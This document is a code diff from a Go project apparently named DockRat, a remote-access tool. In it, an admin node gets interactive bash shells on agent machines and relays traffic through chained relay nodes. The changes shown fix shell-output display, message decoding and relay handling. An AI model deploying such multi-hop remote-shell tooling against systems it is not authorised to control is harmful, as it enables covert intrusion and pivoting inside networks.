@@ -174,17 +174,21 @@ package crypto
 package network
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"net"
+	"os"
+	"regexp"
 
 	"github.com/Singert/DockRat/core/node"
 	"github.com/Singert/DockRat/core/protocol"
 )
 
 // -------------------------- admin专用的监听函数 -------------------------
+var ansiRegex = regexp.MustCompile(`\x1b\[[0-9;?]*[a-zA-Z]`)
 
 func StartListener(addr string, registry *node.Registry) {
 	ln, err := net.Listen("tcp", addr)
@@ -281,49 +285,32 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 		case protocol.MsgResponse:
 			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
 		case protocol.MsgShell:
-			fmt.Print(string(msg.Payload))
-			fmt.Print("") // 强制触发控制台刷新
+			writeShellOutput(msg.Payload)
 		case protocol.MsgRelayReady:
 			var payload protocol.RelayReadyPayload
 			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 				log.Printf("[-] RelayReady decode failed: %v", err)
 				return
 			}
-			// nodeInfo, ok := registry.Get(payload.SelfID)
-			// ip := "(unknown)"
-			// if ok {
-			// 	ip = nodeInfo.Addr
-			// }
 			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)
 
-			// 可选：标记该 node 为 relay（拓扑用途）
-			// if relayNode, ok := registry.Get(payload.SelfID); ok {
-			// 	// 如果你有 isRelay 字段，可在此设置
-			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
-			// }
 		case protocol.MsgRelayRegister:
 			var payload protocol.RelayRegisterPayload
 			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 				log.Printf("[-] RelayRegister decode failed: %v", err)
 				return
 			}
-
 			newNode := payload.Node
 			newID := newNode.ID
-
-			// 检查是否冲突
 			if _, exists := registry.Get(newID); exists {
 				log.Printf("[-] Duplicate node ID %d rejected", newID)
 				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
 				sendAck(n.Conn, protocol.MsgRelayError, resp)
 				return
 			}
-
-			// 注册
 			registry.AddWithID(&newNode)
 			registry.NodeGraph.SetParent(newID, payload.ParentID)
 			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
-
 			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
 			sendAck(n.Conn, protocol.MsgRelayAck, resp)
 
@@ -335,14 +322,14 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 				return
 			}
 
-			// ✅ 特殊情况：目标是 admin 本人（DestID == -1）
+			reader := bytes.NewReader(pkt.Data)
+			innerMsg, err := protocol.ReadMessage(reader)
+			if err != nil {
+				log.Printf("[-] Failed to decode inner message: %v", err)
+				return
+			}
+
 			if pkt.DestID == -1 {
-				var innerMsg protocol.Message
-				err := json.Unmarshal(pkt.Data, &innerMsg)
-				if err != nil {
-					log.Printf("[-] Failed to decode inner message to admin: %v", err)
-					return
-				}
 				switch innerMsg.Type {
 				case protocol.MsgRelayRegister:
 					var payload protocol.RelayRegisterPayload
@@ -352,45 +339,36 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 					}
 					newNode := payload.Node
 					newID := newNode.ID
-
 					if _, exists := registry.Get(newID); exists {
 						log.Printf("[-] Duplicate node ID %d rejected", newID)
 						resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
 						sendAck(n.Conn, protocol.MsgRelayError, resp)
 						return
 					}
-
 					registry.AddWithID(&newNode)
 					registry.NodeGraph.SetParent(newID, payload.ParentID)
 					log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
-
 					resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
 					sendAck(n.Conn, protocol.MsgRelayAck, resp)
+
 				case protocol.MsgShell:
-					log.Printf("[Admin] Displaying shell output:\n%s", string(innerMsg.Payload))
-					fmt.Print(string(innerMsg.Payload))
-					fmt.Print("") // 强制触发控制台刷新
+					log.Printf("[Admin] Displaying shell output (direct):")
+					writeShellOutput(innerMsg.Payload)
+
 				default:
 					log.Printf("[-] Unknown message type sent to admin: %s", innerMsg.Type)
 				}
-				return // ❗重要：处理完后不要再继续下发
-			}
-
-			// ✅ 正常 relay 处理流程
-			innerMsg, err := protocol.DecodeMessage(pkt.Data)
-			if err != nil {
-				log.Printf("[-] Failed to decode inner message: %v", err)
 				return
 			}
 
+			// relay → relay/admin 正常下发
 			switch innerMsg.Type {
 			case protocol.MsgResponse:
 				log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
 			case protocol.MsgShell:
-				fmt.Print(string(innerMsg.Payload))
-				fmt.Print("") // 强制触发控制台刷新
+				writeShellOutput(innerMsg.Payload)
 			default:
-				// 向下 relay：找父节点继续下发
+				// 向下 relay
 				parentID := registry.NodeGraph.GetParent(pkt.DestID)
 				if parentID == -1 {
 					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
@@ -403,7 +381,7 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 				}
 				fwdMsg := protocol.Message{
 					Type:    protocol.MsgRelayPacket,
-					Payload: msg.Payload, // 原始封装即可
+					Payload: msg.Payload,
 				}
 				buf, err := protocol.EncodeMessage(fwdMsg)
 				if err != nil {
@@ -415,11 +393,21 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
 				}
 			}
-
 		default:
 			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
 		}
 	}
+}
+
+func writeShellOutput(payload []byte) {
+	clean := ansiRegex.ReplaceAll(payload, []byte{})
+
+	// 过滤常见 bash 提示符前缀
+	clean = bytes.ReplaceAll(clean, []byte("bash-5.2$ "), []byte(""))
+	clean = bytes.ReplaceAll(clean, []byte("bash-5.1$ "), []byte(""))
+
+	os.Stdout.Write(clean)
+	os.Stdout.Sync()
 }
 func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
 	data, _ := json.Marshal(ack)
@@ -440,8 +428,11 @@ import (
 	"io"
 	"log"
 	"net"
+	"os"
 	"os/exec"
 	"strings"
+
+	"golang.org/x/term"
 
 	"github.com/Singert/DockRat/core/common"
 	"github.com/Singert/DockRat/core/node"
@@ -545,7 +536,10 @@ func handleStartRelay(msg protocol.Message, conn net.Conn) {
 	resp := protocol.Message{Type: protocol.MsgRelayReady, Payload: data}
 	buf, _ := protocol.EncodeMessage(resp)
 	conn.Write(buf)
-	StartRelayAgent(conn, ctx)
+
+	go StartRelayAgent(conn, ctx) // 用于处理 admin 向 relay 发来的控制命令
+
+	select {}
 }
 
 // ✅ 读取一个消息帧
@@ -587,26 +581,31 @@ func handleCommand(msg protocol.Message, conn net.Conn, ctx *RelayContext) {
 	}
 }
 
-// ✅ shell 模式处理（支持远程交互）
 func handleShellPTY(msg protocol.Message, conn net.Conn, ctx *RelayContext, nodeID int) {
 	line := string(msg.Payload)
+	log.Printf("[Shell] Received shell input from admin: %q (node %d)", line, nodeID)
 
 	// 获取或初始化会话
 	session, exists := shellSessionMap[nodeID]
 	if !exists {
-		cmd := exec.Command("/bin/sh")
+		cmd := exec.Command("bash", "--norc", "--noprofile") // ✅ 更真实的交互环境
+		cmd.Env = append(os.Environ(), "TERM=xterm")         // ✅ 加强兼容性
+
 		ptmx, err := pty.Start(cmd)
 		if err != nil {
 			log.Println("[-] Failed to start pty:", err)
 			return
 		}
-
+		if _, err := term.MakeRaw(int(ptmx.Fd())); err != nil {
+			log.Println("[-] Failed to set PTY raw mode:", err)
+		}
 		session = &ShellSession{
 			Stdin:   ptmx,
 			Started: true,
 		}
 		shellSessionMap[nodeID] = session
 
+		// ✅ 启动 goroutine 读取 shell 输出
 		go func() {
 			buf := make([]byte, 1024)
 			for {
@@ -615,13 +614,19 @@ func handleShellPTY(msg protocol.Message, conn net.Conn, ctx *RelayContext, node
 					log.Printf("[-] Shell session for node %d read error: %v", nodeID, err)
 					return
 				}
+				if n == 0 {
+					continue
+				}
+				payload := buf[:n]
+				log.Printf("[Shell] Read %d bytes from PTY for node %d: %q", n, nodeID, payload)
 
 				msg := protocol.Message{
 					Type:    protocol.MsgShell,
-					Payload: buf[:n],
+					Payload: payload,
 				}
 
-				if ctx != nil {
+				if ctx != nil && nodeID != ctx.SelfID {
+					log.Printf("[Shell] Relaying shell output upward from node %d", nodeID)
 					RelayUpward(ctx, msg)
 				} else {
 					data, _ := protocol.EncodeMessage(msg)
@@ -640,6 +645,7 @@ func handleShellPTY(msg protocol.Message, conn net.Conn, ctx *RelayContext, node
 		log.Printf("[-] Write to shell session %d failed: %v", nodeID, err)
 	}
 }
+
 func FindNodeIDByConn(reg *node.Registry, conn net.Conn) int {
 	for _, n := range reg.List() {
 		if n.Conn == conn {
@@ -647,6 +653,27 @@ func FindNodeIDByConn(reg *node.Registry, conn net.Conn) int {
 		}
 	}
 	return -1
+}
+func StartBasicAgentWithID(conn net.Conn, ctx *RelayContext, nodeID int) {
+	for {
+		msg, err := readMessageFromConn(conn)
+		if err != nil {
+			log.Printf("[-] Agent connection closed: %v", err)
+			return
+		}
+
+		switch msg.Type {
+		case protocol.MsgCommand:
+			handleCommand(msg, conn, ctx)
+		case protocol.MsgShell:
+			handleShellPTY(msg, conn, ctx, nodeID) // ✅ 用 relay 分配的真实 ID
+		case protocol.MsgStartRelay:
+			handleStartRelay(msg, conn)
+			return
+		default:
+			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
+		}
+	}
 }
 
 文件：./core/network/packet.go
@@ -798,7 +825,11 @@ func HandleRelayConnection(conn net.Conn, ctx *RelayContext) {
 	// go HandleRelayAgentMessages(n, ctx)
 
 	//监听来自该连接的 relay_packet 上报（如：relayN 注册信息）
-	go StartRelayAgent(conn, ctx)
+	// go StartRelayAgent(conn, ctx)
+
+	go HandleRelayAgentMessages(n, ctx)
+	go StartBasicAgentWithID(conn, ctx, n.ID)
+	select {}
 }
 
 // 该函数与 admin 的 handleAgentMessages() 类似，
@@ -834,7 +865,7 @@ func HandleRelayAgentMessages(n *node.Node, ctx *RelayContext) {
 			continue
 		}
 		fmt.Println("Relay received message from node", n.ID, ":", msg)
-		innerJson, _ := json.Marshal(msg)
+		innerJson, _ := protocol.EncodeMessage(msg)
 		fmt.Printf("[Relay %d] ↑ RelayUpward called for message: Type=%s\n", ctx.SelfID, msg.Type)
 
 		// ✅ 构造 RelayPacket 上送
@@ -926,16 +957,14 @@ func bytesToUint32(b []byte) uint32 {
 }
 func RelayUpward(ctx *RelayContext, msg protocol.Message) {
 	log.Printf("[RelayUpward] type=%s len=%d", msg.Type, len(msg.Payload))
-	inner, _ := json.Marshal(msg)
-	var debugMsg protocol.Message
-	json.Unmarshal(inner, &debugMsg)
-	log.Printf("[RelayUpward] marshalled check: Type=%s", debugMsg.Type)
 
+	inner, _ := protocol.EncodeMessage(msg) // ✅ 使用正确的带前缀格式
 	pkt := protocol.RelayPacket{
 		DestID: -1,
 		Data:   inner,
 	}
 	pktBytes, _ := json.Marshal(pkt)
+
 	wrapped := protocol.Message{
 		Type:    protocol.MsgRelayPacket,
 		Payload: pktBytes,
@@ -1226,15 +1255,10 @@ func handleExec(arg string, reg *node.Registry) {
 	}
 }
 
+
 func handleShell(arg string, reg *node.Registry) {
 	var nid int
 	fmt.Sscanf(arg, "%d", &nid)
-
-	msg := Message{Type: MsgShell, Payload: []byte("\n")}
-	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
-		fmt.Println("[-]", err)
-		return
-	}
 
 	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
 	scanner := bufio.NewScanner(os.Stdin)
@@ -1244,7 +1268,11 @@ func handleShell(arg string, reg *node.Registry) {
 			break
 		}
 		line := scanner.Text()
-		if strings.TrimSpace(line) == "exit" {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue // ✅ 忽略空输入
+		}
+		if trimmed == "exit" {
 			break
 		}
 		cmdMsg := Message{Type: MsgShell, Payload: []byte(line + "\n")}
@@ -1344,41 +1372,7 @@ func sendMessageOrRelay(nid int, msg Message, reg *node.Registry) error {
 	_, err = parentConn.Write(buf)
 	return err
 
-	// // ✅ 否则向上 relay
-	// parentID := reg.NodeGraph.GetParent(nid)
-	// parentNode, ok := reg.Get(parentID)
-	// if !ok {
-	// 	return fmt.Errorf("no relay available for node %d: parent node %d not found", nid, parentID)
-	// }
-	// if parentNode.Conn == nil {
-	// 	return fmt.Errorf("no relay available for node %d: parent node %d has nil conn", nid, parentID)
-	// }
 
-	// packet := RelayPacket{
-	// 	DestID: nid,
-	// 	Data:   data,
-	// }
-	// pktBytes, err := json.Marshal(packet)
-	// if err != nil {
-	// 	return fmt.Errorf("relay packet marshal failed: %w", err)
-	// }
-
-	// wrapped := Message{
-	// 	Type:    MsgRelayPacket,
-	// 	Payload: pktBytes,
-	// }
-	// buf, err := EncodeMessage(wrapped)
-	// if err != nil {
-	// 	return fmt.Errorf("relay encode error: %w", err)
-	// }
-
-	// // ✅ 向父节点转发
-	// _, err = parentNode.Conn.Write(buf)
-	// if err != nil {
-	// 	return fmt.Errorf("relay write error: %w", err)
-	// }
-	// return nil
-}
 
 文件：./core/protocol/message.go
 内容：
